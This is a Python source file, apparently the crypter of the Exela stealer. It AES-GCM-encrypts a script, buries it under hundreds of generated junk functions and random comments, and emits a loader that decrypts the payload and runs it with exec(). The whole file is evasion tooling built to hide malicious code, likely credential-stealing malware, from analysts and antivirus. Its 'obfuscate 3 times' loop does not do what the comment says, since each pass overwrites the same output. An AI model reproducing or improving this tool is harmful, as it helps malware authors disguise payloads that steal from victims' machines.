import string
import argparse
import random
import os
import time
import base64
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

Exela_Modules = "import ctypes, platform ,json, sys, shutil, sqlite3\nimport re, os, asyncio, aiohttp, time, base64\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nfrom cryptography.hazmat.backends import default_backend"
Decrypt_Func_Script = """
def DecryptString(key, tag, nonce, _input) -> str:
    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag))
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(_input) + decryptor.finalize()
    return decrypted_data.decode(errors="ignore")
"""


class Obfuscate:
    def __init__(self, file_path: str, output_path: str) -> None:
        self.file_path = file_path
        self.output_path = output_path
        self.nonce = os.urandom(12)  # Generate a random nonce
        self.salt = os.urandom(16)  # Generate random salt for KDF
        self.kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            iterations=100000,  # Number of iterations
            salt=self.salt,  # Random salt
            length=32,  # Key length (256-bit)
        )
        self.key = self.kdf.derive(os.urandom(16))  # Randomly derive key
        self.tag = bytes()  # Will be filled after encryption

    def Main(self) -> None:
        if not os.path.exists(self.file_path):
            print("The file does not exist :(")
            exit(0)

        junk_code = self.GenerateJunkCode()
        commands = self.GenerateCommandLines()

        for _ in range(200):
            junk_code += self.GenerateJunkCode()
            commands += self.GenerateCommandLines()

        with open(self.file_path, "rb") as file:
            data = file.read()

        encrypted_data, tag = self.EncryptString(data)

        with open(self.output_path, "w", errors="ignore") as file:
            file.write(Exela_Modules)
            file.write(commands)
            file.write(junk_code)
            file.write(f"\n{Decrypt_Func_Script}\n\n")

        with open(self.output_path, "ab") as file:
            file.write(b"key = base64.b64decode('" + base64.b64encode(self.key) + b"')")
            file.write(b"\ntag = base64.b64decode('" + base64.b64encode(tag) + b"')")
            file.write(b"\nnonce = base64.b64decode('" + base64.b64encode(self.nonce) + b"')")
            file.write(b"\nsalt = base64.b64decode('" + base64.b64encode(self.salt) + b"')")
            file.write(b"\nencrypted_data = base64.b64decode('" + base64.b64encode(encrypted_data) + b"')\n")
            file.write(b"exec(DecryptString(key, tag, nonce, encrypted_data))\n")
            file.write(b"# Coded by Quicaxd\n")

    def EncryptString(self, _input):
        cipher = Cipher(algorithms.AES(self.key), modes.GCM(self.nonce))
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(_input) + encryptor.finalize()
        self.tag = encryptor.tag
        return encrypted_data, self.tag

    def GenerateJunkCode(self) -> str:
        data = f"""
def {self.GenerateRandomString(8)}{random.randint(99999, 9999999)}():
    if {random.randint(99999, 9999999)} == {random.randint(99999, 9999999)}:

        print({random.randint(99999, 9999999)})
        aaa{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}

        print({random.randint(99999, 9999999)})
        bbb{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}

        aa{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}

        z{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}
        zz{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}

        c{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}
        cc{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}

    elif {random.randint(99999, 9999999)} == {random.randint(99999, 9999999)}:

        print({random.randint(99999, 9999999)})

        aaa{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}
        print({random.randint(99999, 9999999)})

        bbb{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}
        aa{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}
        x{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}
        xx{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}

        a{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}
        aa{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}
        """

        return data

    def GenerateCommandLines(self) -> str:
        return f"# {self.GenerateRandomString(15)}\n"

    def GenerateRandomString(self, length: int) -> str:
        characters = string.ascii_letters + string.digits
        return ''.join(random.choices(characters, k=length))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Obfuscate data using AES-GCM encryption."
    )
    parser.add_argument("file_path", type=str, help="File to obfuscate")
    parser.add_argument("output_path", type=str, help="Output file")
    args = parser.parse_args()

    t = time.time()
    Obfuscator = Obfuscate(args.file_path, args.output_path)
    for _ in range(3):  # obfuscate 3 times (adjust as needed)
        Obfuscator.Main()

    print(f"The code was obfuscated in {str(time.time() - t)} seconds\n")
